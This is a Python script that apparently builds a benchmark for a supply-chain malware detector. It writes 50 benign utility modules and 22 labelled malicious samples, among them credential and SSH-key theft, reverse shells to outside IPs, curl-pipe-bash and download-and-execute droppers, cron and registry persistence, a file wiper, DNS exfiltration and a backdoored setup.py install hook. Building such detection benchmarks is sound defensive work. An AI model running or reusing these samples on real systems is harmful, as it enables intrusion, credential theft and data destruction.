"""
SupplyShield - Benchmark Dataset Builder
Constructs 50 realistic benign Python samples and 22 distinct malicious attack variants.
All files are saved into:
  - benchmarks/samples/benign/
  - benchmarks/samples/malicious/
"""

import os

BENIGN_DIR = os.path.join(os.path.dirname(__file__), "samples", "benign")
MALICIOUS_DIR = os.path.join(os.path.dirname(__file__), "samples", "malicious")

os.makedirs(BENIGN_DIR, exist_ok=True)
os.makedirs(MALICIOUS_DIR, exist_ok=True)


BENIGN_SAMPLES = {
    "01_math_geometry.py": '''"""Geometry and trigonometry calculations."""
import math

def circle_area(radius: float) -> float:
    if radius < 0:
        raise ValueError("Radius must be non-negative")
    return math.pi * radius * radius

def sphere_volume(radius: float) -> float:
    return (4.0 / 3.0) * math.pi * (radius ** 3)

def euclidean_distance(x1: float, y1: float, x2: float, y2: float) -> float:
    return math.sqrt((x2 - x1)**2 + (y2 - y1)**2)
''',

    "02_string_utils.py": '''"""String manipulation and sanitization helpers."""
import re

def slugify(text: str) -> str:
    text = text.lower().strip()
    text = re.sub(r'[^\\w\\s-]', '', text)
    return re.sub(r'[-\\s]+', '-', text)

def truncate(text: str, max_length: int = 100, suffix: str = "...") -> str:
    if len(text) <= max_length:
        return text
    return text[:max_length - len(suffix)] + suffix
''',

    "03_json_config.py": '''"""Configuration loader using standard json."""
import json
from typing import Dict, Any

def parse_settings(json_raw: str) -> Dict[str, Any]:
    try:
        return json.loads(json_raw)
    except json.JSONDecodeError as err:
        return {"error": str(err), "valid": False}

def serialize_settings(data: Dict[str, Any]) -> str:
    return json.dumps(data, indent=2, sort_keys=True)
''',

    "04_lru_cache.py": '''"""LRU Cache implementation with collections.OrderedDict."""
from collections import OrderedDict
from typing import Any, Optional

class LRUCache:
    def __init__(self, capacity: int = 128):
        self.capacity = capacity
        self.cache: OrderedDict[str, Any] = OrderedDict()

    def get(self, key: str) -> Optional[Any]:
        if key not in self.cache:
            return None
        self.cache.move_to_end(key)
        return self.cache[key]

    def put(self, key: str, value: Any) -> None:
        if key in self.cache:
            self.cache.move_to_end(key)
        self.cache[key] = value
        if len(self.cache) > self.capacity:
            self.cache.popitem(last=False)
''',

    "05_csv_parser.py": '''"""CSV data reader and processor."""
import csv
import io
from typing import List, Dict

def parse_csv_stream(csv_content: str) -> List[Dict[str, str]]:
    stream = io.StringIO(csv_content)
    reader = csv.DictReader(stream)
    return [row for row in reader]

def write_csv_stream(rows: List[Dict[str, str]], fieldnames: List[str]) -> str:
    output = io.StringIO()
    writer = csv.DictWriter(output, fieldnames=fieldnames)
    writer.writeheader()
    writer.writerows(rows)
    return output.getvalue()
''',

    "06_datetime_helpers.py": '''"""Datetime parsing and formatting utilities."""
from datetime import datetime, timezone, timedelta

def to_utc_iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).isoformat()

def calculate_age_days(created_at: datetime) -> int:
    now = datetime.now(timezone.utc)
    diff = now - created_at.astimezone(timezone.utc)
    return diff.days
''',

    "07_dataclass_models.py": '''"""Data models with dataclasses."""
from dataclasses import dataclass, field
from typing import List, Optional

@dataclass
class UserProfile:
    user_id: int
    username: str
    roles: List[str] = field(default_factory=list)
    is_active: bool = True

    def has_role(self, role: str) -> bool:
        return role in self.roles
''',

    "08_matrix_operations.py": '''"""Simple pure Python matrix math."""
from typing import List

Matrix = List[List[float]]

def matrix_add(a: Matrix, b: Matrix) -> Matrix:
    rows = len(a)
    cols = len(a[0])
    return [[a[r][c] + b[r][c] for c in range(cols)] for r in range(rows)]

def matrix_transpose(m: Matrix) -> Matrix:
    return [[m[j][i] for j in range(len(m))] for i in range(len(m[0]))]
''',

    "09_hash_helpers.py": '''"""Cryptographic hashing wrappers using hashlib."""
import hashlib

def sha256_digest(content: bytes) -> str:
    return hashlib.sha256(content).hexdigest()

def verify_checksum(content: bytes, expected_hash: str) -> bool:
    return hashlib.sha256(content).hexdigest().lower() == expected_hash.lower()
''',

    "10_argparse_cli.py": '''"""Command-line argument parsing with standard argparse."""
import argparse

def build_cli_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Image Resizer CLI")
    parser.add_argument("--input", required=True, help="Path to input image")
    parser.add_argument("--width", type=int, default=800, help="Target width in pixels")
    parser.add_argument("--height", type=int, default=600, help="Target height in pixels")
    return parser
''',

    "11_binary_search.py": '''"""Binary search algorithm."""
from typing import List, Any

def binary_search(arr: List[Any], target: Any) -> int:
    low = 0
    high = len(arr) - 1
    while low <= high:
        mid = (low + high) // 2
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            low = mid + 1
        else:
            high = mid - 1
    return -1
''',

    "12_email_validator.py": '''"""Email format validation using regex."""
import re

EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")

def is_valid_email(email: str) -> bool:
    if not email or len(email) > 254:
        return False
    return bool(EMAIL_REGEX.match(email))
''',

    "13_rate_limiter.py": '''"""Token bucket rate limiter in pure Python."""
import time

class TokenBucket:
    def __init__(self, capacity: int, refill_rate_per_sec: float):
        self.capacity = capacity
        self.refill_rate = refill_rate_per_sec
        self.tokens = float(capacity)
        self.last_update = time.time()

    def consume(self, amount: int = 1) -> bool:
        now = time.time()
        elapsed = now - self.last_update
        self.tokens = min(float(self.capacity), self.tokens + elapsed * self.refill_rate)
        self.last_update = now
        if self.tokens >= amount:
            self.tokens -= amount
            return True
        return False
''',

    "14_markdown_toc.py": '''"""Generates Table of Contents from markdown headings."""
import re
from typing import List, Tuple

def extract_headings(markdown_text: str) -> List[Tuple[int, str]]:
    headings = []
    for line in markdown_text.splitlines():
        match = re.match(r'^(#{1,6})\s+(.*)$', line)
        if match:
            level = len(match.group(1))
            title = match.group(2).strip()
            headings.append((level, title))
    return headings
''',

    "15_logging_formatter.py": '''"""Custom log formatter for standard logging module."""
import logging

class StructuredLogFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        timestamp = self.formatTime(record, "%Y-%m-%d %H:%M:%S")
        return f"[{timestamp}] [{record.levelname:<8}] {record.name}: {record.getMessage()}"
''',

    "16_url_query_parser.py": '''"""URL query string parser using urllib.parse."""
import urllib.parse
from typing import Dict, List

def parse_query_params(url_string: str) -> Dict[str, List[str]]:
    parsed = urllib.parse.urlparse(url_string)
    return urllib.parse.parse_qs(parsed.query)
''',

    "17_graph_traversal.py": '''"""Breadth-first and depth-first search in pure Python."""
from collections import deque
from typing import Dict, List, Set

def bfs(graph: Dict[str, List[str]], start: str) -> List[str]:
    visited: Set[str] = set()
    queue = deque([start])
    visited.add(start)
    order = []
    while queue:
        node = queue.popleft()
        order.append(node)
        for neighbor in graph.get(node, []):
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append(neighbor)
    return order
''',

    "18_password_strength.py": '''"""Password entropy and strength evaluator."""
import math

def calculate_entropy(password: str) -> float:
    pool = 0
    if any(c.islower() for c in password): pool += 26
    if any(c.isupper() for c in password): pool += 26
    if any(c.isdigit() for c in password): pool += 10
    if any(not c.isalnum() for c in password): pool += 32
    if pool == 0 or len(password) == 0:
        return 0.0
    return len(password) * math.log2(pool)
''',

    "19_color_converter.py": '''"""RGB, HEX, and HSL color converters."""
from typing import Tuple

def hex_to_rgb(hex_code: str) -> Tuple[int, int, int]:
    clean = hex_code.lstrip("#")
    return int(clean[0:2], 16), int(clean[2:4], 16), int(clean[4:6], 16)

def rgb_to_hex(r: int, g: int, b: int) -> str:
    return f"#{r:02x}{g:02x}{b:02x}"
''',

    "20_ip_address_validator.py": '''"""IP address parsing with ipaddress standard library."""
import ipaddress

def is_private_ip(ip_str: str) -> bool:
    try:
        ip = ipaddress.ip_address(ip_str)
        return ip.is_private
    except ValueError:
        return False
''',

    "21_stats_calculator.py": '''"""Mean, median, and variance calculations."""
from typing import List
import statistics

def compute_summary_stats(numbers: List[float]):
    if not numbers:
        return None
    return {
        "mean": statistics.mean(numbers),
        "median": statistics.median(numbers),
        "stdev": statistics.stdev(numbers) if len(numbers) > 1 else 0.0
    }
''',

    "22_env_loader.py": '''"""Clean .env file loader parsing key-value pairs without execution."""
from typing import Dict

def parse_env_file(content: str) -> Dict[str, str]:
    env = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" in line:
            k, v = line.split("=", 1)
            env[k.strip()] = v.strip().strip("\'\\"")
    return env
''',

    "23_priority_queue.py": '''"""Heap-based priority queue wrapper."""
import heapq
from typing import Any, Tuple

class PriorityQueue:
    def __init__(self):
        self._queue = []
        self._index = 0

    def push(self, item: Any, priority: int) -> None:
        heapq.heappush(self._queue, (-priority, self._index, item))
        self._index += 1

    def pop(self) -> Any:
        return heapq.heappop(self._queue)[-1]
''',

    "24_text_wrap.py": '''"""Paragraph text wrapping using standard textwrap."""
import textwrap

def format_terminal_box(message: str, width: int = 60) -> str:
    lines = textwrap.wrap(message, width=width)
    border = "+" + "-" * (width + 2) + "+"
    formatted = [border]
    for line in lines:
        formatted.append(f"| {line:<{width}} |")
    formatted.append(border)
    return "\\n".join(formatted)
''',

    "25_currency_formatter.py": '''"""Currency and number formatting."""
from decimal import Decimal, ROUND_HALF_UP

def format_usd(amount: float) -> str:
    d = Decimal(str(amount)).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
    return f"${d:,.2f}"
''',

    "26_uuid_generator.py": '''"""UUID generation helpers."""
import uuid

def generate_prefixed_id(prefix: str = "item") -> str:
    return f"{prefix}_{uuid.uuid4().hex[:12]}"
''',

    "27_memoize_decorator.py": '''"""Function memoization decorator."""
from functools import wraps
from typing import Callable, Any

def memoize(func: Callable) -> Callable:
    cache = {}
    @wraps(func)
    def wrapper(*args) -> Any:
        if args not in cache:
            cache[args] = func(*args)
        return cache[args]
    return wrapper
''',

    "28_compression_helper.py": '''"""Gzip data compression helper."""
import gzip

def compress_text(text: str) -> bytes:
    return gzip.compress(text.encode("utf-8"))

def decompress_text(data: bytes) -> str:
    return gzip.decompress(data).decode("utf-8")
''',

    "29_trie_search.py": '''"""Prefix tree (Trie) for autocomplete."""
class TrieNode:
    def __init__(self):
        self.children = {}
        self.is_end = False

class Trie:
    def __init__(self):
        self.root = TrieNode()

    def insert(self, word: str) -> None:
        node = self.root
        for char in word:
            node = node.children.setdefault(char, TrieNode())
        node.is_end = True
''',

    "30_html_entity_escaper.py": '''"""HTML escaping utilities."""
import html

def sanitize_user_input(raw_html: str) -> str:
    return html.escape(raw_html, quote=True)
''',

    "31_jwt_payload_decoder.py": '''"""JWT payload unpadded base64 decode without secrets."""
import json
import base64

def decode_unverified_jwt_payload(token: str) -> dict:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT token format")
    payload_b64 = parts[1]
    padding = "=" * (4 - len(payload_b64) % 4)
    decoded_bytes = base64.urlsafe_b64decode(payload_b64 + padding)
    return json.loads(decoded_bytes.decode("utf-8"))
''',

    "32_diff_viewer.py": '''"""Unified diff generator using difflib."""
import difflib

def generate_text_diff(old_lines: list, new_lines: list) -> str:
    diff = difflib.unified_diff(old_lines, new_lines, fromfile="before.txt", tofile="after.txt")
    return "\\n".join(diff)
''',

    "33_xml_element_parser.py": '''"""Safe XML parsing with xml.etree.ElementTree."""
import xml.etree.ElementTree as ET

def parse_svg_dimensions(svg_string: str):
    root = ET.fromstring(svg_string)
    return {
        "width": root.attrib.get("width"),
        "height": root.attrib.get("height"),
        "viewBox": root.attrib.get("viewBox")
    }
''',

    "34_sort_algorithms.py": '''"""Quicksort implementation in pure Python."""
from typing import List

def quicksort(arr: List[int]) -> List[int]:
    if len(arr) <= 1:
        return arr
    pivot = arr[len(arr) // 2]
    left = [x for x in arr if x < pivot]
    middle = [x for x in arr if x == pivot]
    right = [x for x in arr if x > pivot]
    return quicksort(left) + middle + quicksort(right)
''',

    "35_semver_comparator.py": '''"""Semantic version string comparator."""
from typing import Tuple

def parse_semver(version: str) -> Tuple[int, int, int]:
    clean = version.lstrip("v").split("-")[0]
    parts = clean.split(".")
    return int(parts[0]), int(parts[1]), int(parts[2])
''',

    "36_linked_list.py": '''"""Singly linked list implementation."""
class Node:
    def __init__(self, val, next_node=None):
        self.val = val
        self.next = next_node

class LinkedList:
    def __init__(self):
        self.head = None

    def append(self, val):
        if not self.head:
            self.head = Node(val)
            return
        curr = self.head
        while curr.next:
            curr = curr.next
        curr.next = Node(val)
''',

    "37_counter_frequency.py": '''"""Word frequency counter with collections.Counter."""
from collections import Counter
import re

def top_frequent_words(text: str, n: int = 5):
    words = re.findall(r"\\b[a-z]{3,}\\b", text.lower())
    return Counter(words).most_common(n)
''',

    "38_fraction_math.py": '''"""Fraction calculation using fractions standard module."""
from fractions import Fraction

def add_fractions(n1: int, d1: int, n2: int, d2: int) -> str:
    f = Fraction(n1, d1) + Fraction(n2, d2)
    return f"{f.numerator}/{f.denominator}"
''',

    "39_base64_safe_encoder.py": '''"""Standard base64 encoding and decoding for binaries."""
import base64

def encode_thumbnail_bytes(image_bytes: bytes) -> str:
    return base64.b64encode(image_bytes).decode("ascii")
''',

    "40_interval_merger.py": '''"""Merge overlapping intervals algorithm."""
from typing import List, Tuple

def merge_intervals(intervals: List[Tuple[int, int]]) -> List[Tuple[int, int]]:
    if not intervals:
        return []
    sorted_int = sorted(intervals, key=lambda x: x[0])
    merged = [sorted_int[0]]
    for current in sorted_int[1:]:
        prev_start, prev_end = merged[-1]
        if current[0] <= prev_end:
            merged[-1] = (prev_start, max(prev_end, current[1]))
        else:
            merged.append(current)
    return merged
''',

    "41_cache_ttl.py": '''"""TTL cache item with expiry timestamp."""
import time

class ExpiringItem:
    def __init__(self, value, ttl_seconds: float):
        self.value = value
        self.expires_at = time.time() + ttl_seconds

    def is_expired(self) -> bool:
        return time.time() > self.expires_at
''',

    "42_bit_manipulation.py": '''"""Bitwise operations for flags."""
def set_flag(mask: int, flag: int) -> int:
    return mask | flag

def clear_flag(mask: int, flag: int) -> int:
    return mask & ~flag

def has_flag(mask: int, flag: int) -> bool:
    return bool(mask & flag)
''',

    "43_pathlib_traversal.py": '''"""Safe local file extension filtering with pathlib."""
from pathlib import Path
from typing import List

def get_py_filenames(root_dir: str) -> List[str]:
    p = Path(root_dir)
    return [f.name for f in p.glob("*.py")]
''',

    "44_chunk_stream.py": '''"""Chunking iterator for lists."""
def chunk_list(items, chunk_size: int):
    for i in range(0, len(items), chunk_size):
        yield items[i:i + chunk_size]
''',

    "45_levenshtein_distance.py": '''"""Edit distance algorithm between two strings."""
def levenshtein_dist(s1: str, s2: str) -> int:
    if len(s1) < len(s2):
        return levenshtein_dist(s2, s1)
    if len(s2) == 0:
        return len(s1)
    prev_row = range(len(s2) + 1)
    for i, c1 in enumerate(s1):
        curr_row = [i + 1]
        for j, c2 in enumerate(s2):
            insertions = prev_row[j + 1] + 1
            deletions = curr_row[j] + 1
            substitutions = prev_row[j] + (c1 != c2)
            curr_row.append(min(insertions, deletions, substitutions))
        prev_row = curr_row
    return prev_row[-1]
''',

    "46_regex_sanitizer.py": '''"""Sanitize dynamic input for regex queries."""
import re

def escape_regex_term(query: str) -> str:
    return re.escape(query)
''',

    "47_retry_policy.py": '''"""Simple exponential backoff calculator."""
def get_backoff_delay(attempt: int, base_delay: float = 0.5, max_delay: float = 10.0) -> float:
    delay = base_delay * (2 ** attempt)
    return min(delay, max_delay)
''',

    "48_flatten_dict.py": '''"""Flattens nested dictionaries into dot notation."""
def flatten_dictionary(d, parent_key="", sep="."):
    items = []
    for k, v in d.items():
        new_key = f"{parent_key}{sep}{k}" if parent_key else k
        if isinstance(v, dict):
            items.extend(flatten_dictionary(v, new_key, sep=sep).items())
        else:
            items.append((new_key, v))
    return dict(items)
''',

    "49_cookie_parser.py": '''"""HTTP cookie string parsing."""
from http import cookies

def parse_raw_cookies(cookie_header: str):
    simple_cookie = cookies.SimpleCookie()
    simple_cookie.load(cookie_header)
    return {k: v.value for k, v in simple_cookie.items()}
''',

    "50_bloom_filter_mock.py": '''"""Mock Bloom filter with multiple hash seeds."""
import hashlib

class SimpleBloomFilter:
    def __init__(self, size: int = 1024):
        self.size = size
        self.bit_array = [0] * size

    def _hashes(self, item: str):
        h1 = int(hashlib.md5(item.encode()).hexdigest(), 16) % self.size
        h2 = int(hashlib.sha1(item.encode()).hexdigest(), 16) % self.size
        return h1, h2

    def add(self, item: str):
        for h in self._hashes(item):
            self.bit_array[h] = 1

    def contains(self, item: str) -> bool:
        return all(self.bit_array[h] for h in self._hashes(item))
'''
}


MALICIOUS_SAMPLES = {
    "mal_01_cred_stealer_aws_env.py": '''"""Malicious: Steals AWS access keys and exfiltrates via socket."""
import os
import socket

def harvest_and_exfiltrate():
    aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(("192.168.1.100", 4444))
        sock.send(f"STOLEN_AWS_KEY: {aws_key}".encode())
        sock.close()
    except Exception:
        pass

harvest_and_exfiltrate()
''',

    "mal_02_cred_stealer_file_paths.py": '''"""Malicious: Reads sensitive user SSH keys and AWS credentials."""
import os

def read_credentials():
    targets = [
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.ssh/id_rsa"),
        "/etc/shadow"
    ]
    loot = ""
    for path in targets:
        try:
            with open(path, "r") as f:
                loot += f.read()
        except Exception:
            pass
    return loot

read_credentials()
''',

    "mal_03_cred_stealer_browser_cookies.py": '''"""Malicious: Searches AppData and Chrome profiles for cookie sqlite db."""
import os
import glob

def find_chrome_cookies():
    user_home = os.path.expanduser("~")
    cookie_pattern = os.path.join(user_home, "AppData", "Local", "Google", "Chrome", "User Data", "*", "Cookies")
    matches = glob.glob(cookie_pattern)
    for cookie_file in matches:
        try:
            with open(cookie_file, "rb") as f:
                data = f.read(512)
        except Exception:
            pass

find_chrome_cookies()
''',

    "mal_04_reverse_shell_bash.py": '''"""Malicious: Spawns interactive bash reverse shell via subprocess."""
import subprocess

def launch_reverse_shell():
    cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/194.26.29.112/9001 0>&1"]
    subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

launch_reverse_shell()
''',

    "mal_05_reverse_shell_python_socket.py": '''"""Malicious: Pure Python interactive reverse shell using socket and os.dup2."""
import socket
import os
import subprocess

def spawn_pty():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("10.0.0.1", 4242))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception:
        pass

spawn_pty()
''',

    "mal_06_reverse_shell_powershell.py": '''"""Malicious: Spawns hidden PowerShell encoded reverse beacon."""
import subprocess

def run_powershell():
    payload = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgA"
    subprocess.Popen(payload, shell=True)

run_powershell()
''',

    "mal_07_ransom_wiper.py": '''"""Malicious: Recursive file wiper / encryptor."""
import os

def wipe_user_documents():
    target_dir = os.path.expanduser("~/Documents")
    for root, dirs, files in os.walk(target_dir):
        for name in files:
            if name.endswith((".pdf", ".docx", ".xlsx")):
                filepath = os.path.join(root, name)
                try:
                    with open(filepath, "wb") as f:
                        f.write(b"ENCRYPTED_BY_RANSOMWARE")
                except Exception:
                    pass

wipe_user_documents()
''',

    "mal_08_dropper_download_exec.py": '''"""Malicious: Downloads secondary executable payload and runs it."""
import urllib.request
import os
import subprocess

def download_and_detonate():
    url = "http://malicious-c2.org/stage2.exe"
    dest = os.path.expanduser("~/.stage2.exe")
    try:
        urllib.request.urlretrieve(url, dest)
        os.chmod(dest, 0o777)
        subprocess.Popen([dest])
    except Exception:
        pass

download_and_detonate()
''',

    "mal_09_dropper_curl_pipe_sh.py": '''"""Malicious: Downloads payload via curl piped directly into sh."""
import os

def trigger_curl_pipe():
    os.system("curl -sSL http://malicious.cdn/install.sh | bash")

trigger_curl_pipe()
''',

    "mal_10_persistence_cron.py": '''"""Malicious: Installs persistent cron job executing remote beacon."""
import os

def persist_crontab():
    cron_entry = "echo '*/10 * * * * curl http://194.26.29.112/ping | bash' | crontab -"
    os.system(cron_entry)

persist_crontab()
''',

    "mal_11_persistence_windows_reg.py": '''"""Malicious: Adds Run registry key for persistence."""
import subprocess

def add_run_key():
    cmd = 'reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v SecurityUpdate /t REG_SZ /d "C:\\\\Users\\\\Public\\\\backdoor.exe" /f'
    subprocess.run(cmd, shell=True)

add_run_key()
''',

    "mal_12_dns_tunnel_exfiltration.py": '''"""Malicious: Exfiltrates harvested secrets via DNS lookup queries."""
import socket
import base64

def dns_exfiltrate(secret_data: str):
    b64 = base64.b64encode(secret_data.encode()).decode()
    domain = f"{b64[:30]}.attacker-dns-tunnel.com"
    try:
        socket.getaddrinfo(domain, 80)
    except Exception:
        pass

dns_exfiltrate("AWS_SECRET_KEY=supersecret123")
''',

    "mal_13_bidi_trojan_source.py": '''"""Malicious: Bidi override characters (CVE-2021-42574) concealing backdoors."""
# Trojan Source attack using right-to-left override
access_level = "user"
if access_level != "none\\u202e \\u2066# Check admin\\u2069 \\u202e":
    import os
    os.system("whoami")
''',

    "mal_14_homoglyph_mimic.py": '''"""Malicious: Uses Cyrillic homoglyphs in identifiers to hide execution."""
import os as оs  # Uses Cyrillic small letter o (U+043E)

def run():
    оs.system("id")

run()
''',

    "mal_15_obfuscated_base64_eval.py": '''"""Malicious: Obfuscated Base64 decode evaluated dynamically."""
import base64

payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="
decoded = base64.b64decode(payload).decode("utf-8")
eval(decoded)
''',

    "mal_16_obfuscated_nested_layers.py": '''"""Malicious: Multi-layered nested base64 dynamic exec."""
import base64

# Layer 2: base64 of 'import os; os.system("uname -a")'
layer2 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oInVuYW1lIC1hIik="
# Layer 1: base64 of exec(b64decode(...))
layer1 = base64.b64encode(f"import base64; exec(base64.b64decode('{layer2}'))".encode()).decode()

exec(base64.b64decode(layer1))
''',

    "mal_17_monkeypatch_builtins.py": '''"""Malicious: Monkeypatches __builtins__.open to spy on file reads."""
import builtins

original_open = builtins.open

def malicious_open(*args, **kwargs):
    filename = args[0] if args else "unknown"
    # Leaks filename or credentials to network
    return original_open(*args, **kwargs)

builtins.open = malicious_open
''',

    "mal_18_import_hook_meta_path.py": '''"""Malicious: Intercepts module imports via sys.meta_path finder."""
import sys

class MaliciousFinder:
    def find_spec(self, fullname, path, target=None):
        if fullname == "cryptography":
            import os
            os.system("echo 'hijacked import'")
        return None

sys.meta_path.insert(0, MaliciousFinder())
''',

    "mal_19_dynamic_getattr_obfuscation.py": '''"""Malicious: Dynamic callable resolution evading static string matching."""
target_mod = getattr(__import__("o" + "s"), "sys" + "tem")
target_mod("whoami")
''',

    "mal_20_time_delay_sandbox_evasion.py": '''"""Malicious: Sleeps for 60 seconds to evade ephemeral sandbox watchdog."""
import time
import os

time.sleep(60)
os.system("whoami")
''',

    "mal_21_canary_leak_tripwire.py": '''"""Malicious: Tries to read synthetic canary credentials planted by sandbox."""
import os

canary_val = os.environ.get("SUPPLYSHIELD_CANARY_TOKEN")
if canary_val:
    with open("canary_leak.txt", "w") as f:
        f.write(canary_val)
''',

    "mal_22_setup_install_backdoor.py": '''"""Malicious: setup.py executing reverse shell during pip install."""
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        os.system("python -c \\"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',1234));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])\\" &")

setup(
    name="legit-math-utils",
    version="1.0.0",
    cmdclass={"install": PostInstallCommand}
)
'''
}


def build():
    print(f"Building {len(BENIGN_SAMPLES)} benign samples...")
    for filename, code in BENIGN_SAMPLES.items():
        filepath = os.path.join(BENIGN_DIR, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(code)

    print(f"Building {len(MALICIOUS_SAMPLES)} malicious samples...")
    for filename, code in MALICIOUS_SAMPLES.items():
        filepath = os.path.join(MALICIOUS_DIR, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(code)

    print(f"[OK] Successfully built {len(BENIGN_SAMPLES)} benign and {len(MALICIOUS_SAMPLES)} malicious samples.")


if __name__ == "__main__":
    build()
